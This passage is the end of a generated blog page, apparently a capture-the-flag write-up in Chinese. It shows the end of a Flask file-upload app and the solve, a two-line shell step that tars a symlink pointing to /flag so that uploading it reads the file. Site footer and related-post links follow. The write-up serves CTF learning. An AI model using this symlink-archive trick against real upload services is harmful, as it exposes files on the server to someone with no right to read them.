+</span></span><span class="line"><span class="cl">        <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&#34;UPLOAD_FOLDER&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不知道flag在哪，那就直接盲猜一手在根</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ln -s /flag link1
+</span></span><span class="line"><span class="cl">tar -cvf link.tar link1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到flag</p>
+<h2 id="who-am-i">Who am I
+</h2>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/2025-%E9%B9%8F%E7%A8%8B%E6%9D%AF/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-鹏程杯</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025%E9%A2%86%E8%88%AA%E6%9D%AF-awdp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025领航杯-awdp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/buu-awdp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">buu-awdp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cc4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cc4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E9%9D%A2%E7%BB%8F/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">面经</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
